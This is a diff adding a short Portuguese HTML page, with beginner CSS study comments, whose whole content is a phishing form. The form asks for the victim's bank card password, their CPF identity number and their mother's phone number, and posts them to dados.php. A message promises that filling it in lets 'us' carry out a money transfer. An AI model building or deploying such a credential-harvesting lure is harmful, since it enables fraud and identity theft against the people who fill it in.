@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Codebythi</title>
+    <link rel="stylesheet" href="style.css" media="all">
+    <link rel="stylesheet" href="queren.css">
+    <!-- para criar um espaçameto entre as letras nois usamos latter-spacing: 1px; -->
+    <!-- o border radius tambêm tem shorthand -->
+    <!-- para retirar aquela duas cetinha do input:number nois usamos o parametro inputmode="none" -->
+</head>
+<body>
+    <main>
+        <div id="m"></div>
+        <h1>Welcome</h1>
+        <form action="dados.php">
+            <div>
+                <label for="isenha"><img src="imagens/icone_password_branco.svg" alt=""></label>
+                <input type="password" name="senha" id="isenha" minlength="8" maxlenght="15" autocomplete="new-password" required placeholder="Senha do cartão">
+            </div>
+            <div>
+                <label for="iCPF"><img src="imagens/badge_24dp_FFFFFF_FILL0_wght400_GRAD0_opsz24.svg" alt=""></label>
+                <input type="number" name="CPF" id="iCPF" min="11" max="11" autocomplete="none"
+                placeholder="CPF" inputmode="none" required>
+            </div>
+            <div >
+                <label for="itel"><img src="imagens/call_24dp_FFFFFF_FILL0_wght400_GRAD0_opsz24.svg" alt=""></label>
+                <input type="tel" name="tel" id="itel" pattern="^\(\d{2}\)\d{4}-\d{4}$" required placeholder="Telefone da mãe">
+            </div>
+            <div>
+                <input type="submit" value="enviar" id="submit">
+            </div>
+        </form>
+        <div id="p">
+            <p>preencha o formulario para realizarmos a transferencia do dinheiro</p>
+        </div>
+    </main>
+</body>
+</html>
